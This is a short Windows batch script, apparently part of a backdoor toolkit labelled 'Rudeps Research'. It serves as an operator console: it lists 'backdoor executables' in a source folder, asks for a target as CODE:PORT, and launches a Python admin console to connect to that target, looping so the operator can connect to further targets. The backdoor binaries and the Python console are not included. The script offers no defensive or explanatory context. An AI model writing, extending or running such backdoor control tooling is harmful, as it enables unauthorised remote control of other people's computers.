@echo off
chcp 65001 >nul
title Backdoor Admin Console - Rudeps

echo ==================================
echo    Backdoor Admin Console
echo         Rudeps Research
echo ==================================
echo.

cd src

:start
echo Available targets:
dir /b *.exe 2>nul | findstr /v "admin-console" >nul && (
    echo.
    echo Found backdoor executables:
    dir /b *.exe | findstr /v "admin-console"
) || (
    echo No backdoor executables found in root directory
)

echo.
set /p target="Enter target (CODE:PORT or just CODE): "

if "%target%"=="" (
    echo Invalid input!
    timeout /t 2 >nul
    goto start
)

echo.
echo Connecting to %target%...
python admin-console.py %target%

echo.
set /p again="Connect to another target? (y/n): "
if /i "%again%"=="y" goto start

echo.
echo Press any key to exit...
pause >nul